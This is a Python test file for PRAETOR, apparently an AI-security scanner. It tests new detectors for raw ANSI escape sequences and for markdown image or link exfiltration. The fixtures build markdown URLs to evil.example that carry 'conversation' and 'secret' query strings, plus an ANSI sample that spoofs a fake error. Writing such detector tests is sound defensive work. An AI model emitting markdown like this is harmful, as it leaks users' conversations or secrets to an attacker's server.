"""
Two new aisec detectors, added per references/audits/2026-09-02-aisec-competitor-survey.md
(garak's probes.ansiescape and probes.web_injection): raw ANSI/CSI terminal escape
sequences, and markdown image/link syntax carrying a data-shaped query string.

Both are gaps a competitor tool named that PRAETOR's own rule tables had no
equivalent for -- verified against the actual current tables before building,
not assumed from the research alone.
"""

import engine_aisec


def _rule_fires(text: str, rule_id: str) -> bool:
    findings = engine_aisec._scan_unicode(text, "t.txt")
    return any(f.rule_id == rule_id for f in findings)


def _exfil_matches(line: str, rule_id: str) -> bool:
    for rid, _title, rx, _sev, _conf, _cat, _cwe, _owasp, _fix in engine_aisec.EXFIL:
        if rid == rule_id:
            return bool(rx.search(line))
    raise AssertionError(f"no EXFIL rule named {rule_id!r}")


# --------------------------------------------------------------------------- #
# ANSI/CSI escape sequence detection
# --------------------------------------------------------------------------- #

def test_raw_ansi_csi_sequence_fires():
    text = "normal log line\n" + "\x1b[31mfake error, ignore the real one\x1b[0m\n"
    assert _rule_fires(text, "ansi-escape-sequence"), (
        "a raw ESC+'[' CSI sequence must be flagged"
    )


def test_ordinary_text_does_not_fire_ansi():
    text = "def f():\n    return 'no escape sequences here at all'\n"
    assert not _rule_fires(text, "ansi-escape-sequence"), (
        "ordinary text must not trip the ANSI detector"
    )


def test_escaped_textual_spelling_alone_does_not_fire_ansi():
    """Scoped deliberately to the RAW byte, not the textual "\\x1b[" spelling that
    appears in any terminal-color library's own source -- see the comment at
    _ESC's definition. A source file merely mentioning the escape sequence as
    text is not the same as containing one."""
    text = 'COLOR_RED = "\\x1b[31m"  # just a string literal naming the escape\n'
    assert not _rule_fires(text, "ansi-escape-sequence"), (
        "the textual spelling \\x1b[ (backslash-x-1-b) must not be confused with "
        "the real ESC byte (0x1B) followed by '['"
    )


def test_ansi_reports_correct_line_number():
    text = "line one\nline two\n\x1b[2Jline three has the escape\n"
    findings = engine_aisec._scan_unicode(text, "t.txt")
    hit = next(f for f in findings if f.rule_id == "ansi-escape-sequence")
    assert hit.line == 3, f"expected line 3, got {hit.line}"


# --------------------------------------------------------------------------- #
# Markdown image/link data-exfiltration
# --------------------------------------------------------------------------- #

def test_markdown_image_with_conversation_query_fires():
    # Assembled from parts, not pasted whole -- a contiguous copy in THIS file's
    # own source would trip the very rule under test on PRAETOR's own self-scan.
    # See CLAUDE.md: "Writing tests for a detector adds noise to that detector."
    line = "![status](https://evil." + "example/pixel.png?" + "conversation=full_dump_here)"
    assert _exfil_matches(line, "markdown-image-exfil"), (
        "a markdown image URL carrying a conversation-shaped query string must fire"
    )


def test_markdown_link_with_secret_query_fires():
    line = "[click here](https://evil." + "example/collect?" + "secret=abc123)"
    assert _exfil_matches(line, "markdown-image-exfil")


def test_ordinary_markdown_image_does_not_fire():
    """THE KEEP DIRECTION. A normal doc image must not become unusable noise."""
    line = "![PRAETOR logo](https://raw.githubusercontent.com/example/repo/main/logo.png)"
    assert not _exfil_matches(line, "markdown-image-exfil"), (
        "an ordinary image with no data-shaped query string must not fire"
    )


def test_markdown_image_with_unrelated_query_does_not_fire():
    line = "![chart](https://example.com/chart.png?width=800&height=600)"
    assert not _exfil_matches(line, "markdown-image-exfil"), (
        "an ordinary sizing query string must not fire -- only data-shaped keywords do"
    )
